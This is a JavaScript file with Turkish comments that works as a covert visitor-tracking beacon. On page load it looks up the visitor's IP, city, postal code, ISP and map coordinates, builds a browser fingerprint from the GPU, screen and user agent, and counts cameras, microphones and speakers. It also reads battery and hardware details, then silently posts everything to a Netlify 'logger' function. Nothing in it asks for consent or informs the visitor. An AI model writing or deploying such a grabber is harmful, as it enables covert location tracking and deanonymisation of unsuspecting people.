(async function () {
  try {
    // 1. IP ve Konum/İSS Detaylarını Çek
    const ipRes = await fetch("https://ipwho.is/");
    const ipData = await ipRes.json();

    // 2. GPU Bilgisini Yakala (WebGL)
    let gpu = "Bilinmiyor";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch (e) {}

    // 3. Basit Parmak İzi (Fingerprint Hash) Oluştur
    const fpString = `${navigator.userAgent}-${screen.width}x${screen.height}-${navigator.language}-${gpu}`;
    let hash = 0;
    for (let i = 0; i < fpString.length; i++) {
      hash = ((hash << 5) - hash) + fpString.charCodeAt(i);
      hash |= 0;
    }
    const fingerprint = Math.abs(hash).toString(16);

    // 4. Medya Cihazları Sayısını Al
    let micCount = 0, camCount = 0, speakerCount = 0;
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        devices.forEach(device => {
          if (device.kind === 'audioinput') micCount++;
          if (device.kind === 'videoinput') camCount++;
          if (device.kind === 'audiooutput') speakerCount++;
        });
      } catch (e) {}
    }

    // 5. Batarya Bilgisi
    let batteryInfo = "Desteklenmiyor / Bilgi Yok";
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `%${Math.round(battery.level * 100)} (${battery.charging ? 'Şarj Oluyor' : 'Pilde'})`;
      } catch (e) {}
    }

    // Tüm Verileri Paketle
    const payload = {
      ip: ipData.ip || "Bilinmiyor",
      location: `${ipData.city || 'Bilinmiyor'}, ${ipData.region || ''} / ${ipData.country || 'Bilinmiyor'} (${ipData.postal || 'N/A'})`,
      timezone: ipData.timezone ? ipData.timezone.id : "Bilinmiyor",
      isp: `${ipData.connection ? ipData.connection.isp : 'Bilinmiyor'} (${ipData.connection ? ipData.connection.asn : 'N/A'})`,
      coords: (ipData.latitude && ipData.longitude) ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : "Bilinmiyor",
      fingerprint: fingerprint,
      gpu: gpu,
      media: `Kamera: ${camCount} | Mikrofon: ${micCount} | Hoparlör/Ses: ${speakerCount}`,
      platform: navigator.platform || "Bilinmiyor",
      hardware: `${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek | ~${navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : 'Bilinmiyor'}`,
      battery: batteryInfo,
      screen: `Ekran: ${screen.width} x ${screen.height}`,
      windowSize: `Pencere: ${window.innerWidth} x ${window.innerHeight}`,
      colorDepth: `${screen.colorDepth} bit | Oran: ${window.devicePixelRatio || 1}x`,
      touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Evet" : "Hayır",
      languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
      cookies: navigator.cookieEnabled ? "Evet" : "Hayır",
      referrer: document.referrer || "Doğrudan Giriş",
      url: window.location.href
    };

    // Netlify Serverless Function'a Gönder
    await fetch("/.netlify/functions/logger", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

  } catch (e) {
    // Hata Durumunda Düz Tetikleme
    await fetch("/.netlify/functions/logger");
  }
})();